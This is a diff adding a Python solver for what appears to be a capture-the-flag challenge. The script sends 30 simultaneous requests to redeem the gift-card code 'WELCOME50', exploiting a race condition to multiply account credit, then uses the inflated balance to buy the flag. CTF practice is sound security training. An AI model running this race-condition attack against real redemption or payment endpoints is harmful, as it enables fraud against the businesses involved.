@@ -1,0 +1,111 @@
+import urllib.request
+import urllib.error
+import http.cookiejar
+import json
+import concurrent.futures
+
+# Change this to the CTF server
+TARGET = "http://10.21.232.223:54209"
+
+# Cookie jar keeps our Flask session
+cookie_jar = http.cookiejar.CookieJar()
+
+opener = urllib.request.build_opener(
+    urllib.request.HTTPCookieProcessor(cookie_jar)
+)
+
+
+def get(url):
+    req = urllib.request.Request(url, method="GET")
+    return opener.open(req, timeout=10).read().decode()
+
+
+def post(url, data):
+    body = json.dumps(data).encode()
+
+    req = urllib.request.Request(
+        url,
+        data=body,
+        method="POST",
+        headers={
+            "Content-Type": "application/json"
+        }
+    )
+
+    try:
+        response = opener.open(req, timeout=10)
+        return response.status, response.read().decode()
+
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode()
+
+
+# --------------------------------------------------
+# 1. Create our session
+# --------------------------------------------------
+
+print("[+] Creating session...")
+
+get(TARGET + "/")
+
+print("[+] Session created")
+
+
+# --------------------------------------------------
+# 2. Race the gift-card redemption
+# --------------------------------------------------
+
+def redeem(_):
+    return post(
+        TARGET + "/api/redeem",
+        {"code": "WELCOME50"}
+    )
+
+
+print("[+] Sending 30 simultaneous redemption requests...")
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+    results = list(executor.map(redeem, range(30)))
+
+
+# --------------------------------------------------
+# 3. Display results
+# --------------------------------------------------
+
+print("\n[+] Redemption results:")
+
+successes = 0
+
+for status, body in results:
+    print(status, body)
+
+    if status == 200:
+        successes += 1
+
+print("\n[+] Successful redemptions:", successes)
+
+
+# --------------------------------------------------
+# 4. Check balance
+# --------------------------------------------------
+
+print("\n[+] Checking balance...")
+
+balance_response = get(TARGET + "/api/balance")
+
+print("[+] Balance:", balance_response)
+
+
+# --------------------------------------------------
+# 5. Buy the flag
+# --------------------------------------------------
+
+print("\n[+] Attempting to buy ramen...")
+
+status, body = post(
+    TARGET + "/api/buy_ramen",
+    {}
+)
+
+print("[+] Status:", status)
+print("[+] Response:", body)
